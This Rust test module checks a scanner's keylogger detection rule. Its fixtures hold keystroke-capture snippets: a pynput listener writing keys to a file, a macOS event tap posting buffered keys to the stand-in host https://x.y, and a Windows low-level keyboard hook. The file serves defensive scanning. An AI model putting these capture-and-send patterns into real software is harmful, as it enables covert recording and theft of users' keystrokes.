use super::super::{Kind, ids, scan_text};
use super::*;

// Fixtures assemble the API names from pieces too, so the matcher sees
// the real token at run time while this file's own source does not.
fn tap() -> String {
    format!(
        "CFMachPortRef t = {}(kCGSessionEventTap, 0, 0, 1 << {}, cb, NULL);\n",
        concat!("CGEventTap", "Create"),
        concat!("kCGEventKey", "Down")
    )
}

#[test]
fn installed_or_sending_or_writing_fails() {
    let node = format!("const gkl = require('{}');\n", concat!("node-global-", "key-listener"));
    assert_eq!(
        ids(&scan_text("ext/bg.js", &node, Kind::Installed)),
        [("SUSPECT-KEYLOGGER", true)],
        "installed code fails"
    );
    let py = format!(
        "from {} import keyboard\nk=[]\ndef on(key):\n open('keys.txt','a').write(str(key))\nkeyboard.{}(on_press=on).start()\n",
        concat!("pyn", "put"),
        concat!("List", "ener")
    );
    let got = scan_text("tracker.py", &py, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-KEYLOGGER", true)], "writing keys to a file fails: {got:?}");
    assert!(got[0].note.contains("writing captured keys to a file"), "{}", got[0].note);
    let send = format!("{}requests.post('https://x.y', data=buf)\n", tap());
    let got = scan_text("mac_tap.c", &send, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-KEYLOGGER", true)], "{got:?}");
    assert!(got[0].note.contains("macOS event tap"), "{}", got[0].note);
}

#[test]
fn a_repos_own_capture_warns() {
    let win =
        format!("HHOOK h = {}({}, proc, hMod, 0);\n", concat!("SetWindowsHook", "Ex"), concat!("WH_KEYBOARD", "_LL"));
    assert_eq!(ids(&scan_text("src/hotkeys.c", &win, Kind::Repo)), [("SUSPECT-KEYLOGGER", false)], "a lone hook warns");
    assert_eq!(
        ids(&scan_text("src/tap.m", &tap(), Kind::Repo)),
        [("SUSPECT-KEYLOGGER", false)],
        "an accessibility tap in the repo's own source warns"
    );
    assert_eq!(
        ids(&scan_text("tests/tap.m", &format!("{}fs.writeFileSync('k', buf)\n", tap()), Kind::Repo)),
        [("SUSPECT-KEYLOGGER", false)],
        "a test path never fails"
    );
}

#[test]
fn negatives() {
    let handler = format!("element.addEventListener('{}', onKey)\n", concat!("key", "down"));
    assert!(scan_text("src/ui.js", &handler, Kind::Repo).is_empty(), "a page key handler");
    let one_check = format!("{}(VK_SHIFT)\n", concat!("GetAsyncKey", "State"));
    assert!(scan_text("src/poll.c", &one_check, Kind::Repo).is_empty(), "a single key check, no loop");
    assert!(scan_text("notes.md", &tap(), Kind::Repo).is_empty(), "prose is not read");
    assert!(signal("plain text").is_none());
}
